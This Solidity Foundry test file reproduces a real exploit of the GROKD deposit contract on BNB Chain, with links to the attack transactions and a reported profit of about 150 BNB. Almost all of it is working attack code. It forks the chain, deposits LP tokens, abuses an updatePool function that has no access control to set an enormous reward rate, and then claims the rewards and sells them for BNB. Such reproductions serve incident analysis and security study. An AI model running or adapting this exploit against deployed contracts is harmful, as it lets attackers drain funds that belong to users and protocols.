// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./../interface.sol";

// TX 1:https://app.blocksec.com/explorer/tx/bsc/0x383dbb44a91687b2b9bbd8b6779957a198d114f24af662776f384569b84fc549
// TX 2: https://app.blocksec.com/explorer/tx/bsc/0x8293946b5c88c4a21250ca6dc93c6d1a695fb5d067bb2d4aed0a11bd5af1fb32
// GUY : https://x.com/hipalex921/status/1778482890705416323?t=KvvG83s7SXr9I55aftOc6w&s=05
// Exploit Address:https://bscscan.com/address/0x31d3231cda62c0b7989b488ca747245676a32d81

// Profit : ~ 150 bnb
// REASON : lack of access control;

interface IDeposite {
     function deposit(address to, uint256 amount) external;
    function pending(address) external view returns (uint256 bnbAmount, uint256 erc20Amount,uint256 lpAmount);
     function poolInfo(uint256) external view returns (uint256 startBlock, uint256 endBlock, uint256 rewardPerBlock);
    function updatePool(uint256,PoolInfo calldata) external ;
    struct PoolInfo {
        uint256 startBlock;
        uint256 endBlock;
        uint256 rewardPerBlock;
    }
    function withdraw(uint256 amount) external;
    function userInfo(address) external view returns (address inviter, uint256 amount, uint256 rewardDebt, uint256 rewardBNBDebt, uint256 rewardLPDebt, uint256 lastRewardBlock, uint256 saveBNBBlaance, uint256 saveGrokDBlaance, uint256 releaseBlock);
    function depositFromIDO(address to, uint256 amount) external;
    function reward() external;
    function update() external;
}
contract GROKDTest is Test {
    address _grokd = 0xa4133feD73Ea3361f2f928f98313b1e1e5049612;
    address _pair = 0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD;
    address _wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address _cake_lp = 0x8AF65d9114DfcCd050e7352D77eeC98f40c42CFD;
    address  _route =payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address _deposite = 0x31d3231cDa62C0b7989b488cA747245676a32D81;

    IERC20 grokd = IERC20(_grokd);
    IWETH wBNB = IWETH(payable(_wBNB));
    IERC20 pair_token = IERC20(_cake_lp);
    IDeposite depositor = IDeposite(0x31d3231cDa62C0b7989b488cA747245676a32D81);
    IUniswapV2Pair pair = IUniswapV2Pair(_cake_lp);
    IUniswapV2Router route = IUniswapV2Router(payable(_route));

    function setUp() public {
        vm.createSelectFork("bsc",37622476);
    }
    function testExploit()  external {
        deal(address(this),5 ether);
        uint256 _beforeB = address(this).balance;
        approveAll();
        getLpToken(5 ether);
        {(uint256 startBlock, uint256 endBlock, uint256 rewardPerBlock) = depositor.poolInfo(0);
        console2.log("get startBlock is ",startBlock);
        console2.log("get endBlock is ",endBlock);
        console2.log("get rewardPerBlock is ",rewardPerBlock);
        (uint256 bnbAmount, uint256 erc20Amount,uint256 lpAmount) = depositor.pending(address(this));
        console2.log("current bnbAmount reward is ",bnbAmount);
        console2.log("current profit erc20Amount reward is ",erc20Amount);
        console2.log("current lpAmount reward is ",lpAmount);
        
        //set the pool params,could get a very high reward per block.
        IDeposite.PoolInfo memory _poolInfo = IDeposite.PoolInfo({
            startBlock:0,
            endBlock:block.number +100000000,
            rewardPerBlock:48000000 ether
        });
        //deposit token to contract.
        uint256 depositeAmount = pair_token.balanceOf(address(this));
        console2.log("deposit lp amount is ",depositeAmount);
        console2.log("total token in pool is ",grokd.balanceOf(_deposite));
        depositor.depositFromIDO(address(this),depositeAmount);
        vm.roll(block.number +1);
        //update pool
        depositor.updatePool(0,_poolInfo);
        (uint256 startBlock2, uint256 endBlock2, uint256 rewardPerBlock2) = depositor.poolInfo(0);
        console2.log("after set pooldate startBlock is ",startBlock2);
        console2.log("after set pooldate endBlock is ",endBlock2);
        console2.log("after set pooldate rewardPerBlock is ",rewardPerBlock2);
         /*(uint256 startBlock2, uint256 endBlock2, uint256 rewardPerBlock2) = depositor.poolInfo(0);
         console2.log(" startBlock2 is ",startBlock2);
        console2.log("get endBlock2 is ",endBlock2);
        console2.log("get rewardPerBlock2 is ",rewardPerBlock2);*/
        //update reward
        vm.roll(block.number +1);
        depositor.update();

        (uint256 bnbAmount2, uint256 erc20Amount2,uint256 lpAmount2) = depositor.pending(address(this));
        console2.log("affter one block get bnbAmount2 is ",bnbAmount2);
        console2.log("affter one block get grokd Amount2 is ",erc20Amount2);
        console2.log("affter one block get lpAmount2 is ",lpAmount2);
        depositor.reward();
        swapToken2Bnb(grokd.balanceOf(address(this)));
        }
        uint256 _afterB = address(this).balance;
        uint256 _profit = _afterB - _beforeB;
        console2.log("total profit bnb is ",_profit);
    }
    //get lp token and deposit it.
    function getLpToken(uint256 _amount) internal {
        (bool success,) = _wBNB.call{value: _amount}("");
        require(success,"fuck!");
        address[] memory paths = new address[](2);
        paths[0] = _wBNB;
        paths[1] = _grokd;
        route.swapExactTokensForTokensSupportingFeeOnTransferTokens(2.5 ether,0,paths,address(this),type(uint256).max);
        (
      uint112 reserve0,
      uint112 reserve1, 
        )   =pair.getReserves();
        uint256 balance0 = grokd.balanceOf(address(pair));
        uint256 balance1 = grokd.balanceOf(address(pair));
        route.addLiquidity(_grokd,_wBNB,grokd.balanceOf(address(this)),wBNB.balanceOf(address(this)),100000 ether,1 ether,address(this),type(uint256).max);
    }
    function swapToken2Bnb(uint256 amount) internal {
        address[] memory paths = new address[](2);
        paths[0] = _grokd;
        paths[1] = _wBNB;
        route.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,paths,address(this),type(uint256).max);
        wBNB.withdraw(wBNB.balanceOf(address(this)));
    }
    function approveAll() internal{
        grokd.approve(_route,type(uint256).max);
        wBNB.approve(_route,type(uint256).max);
        pair_token.approve(_deposite,type(uint256).max);
    }
    receive() payable external {
        
    }
}
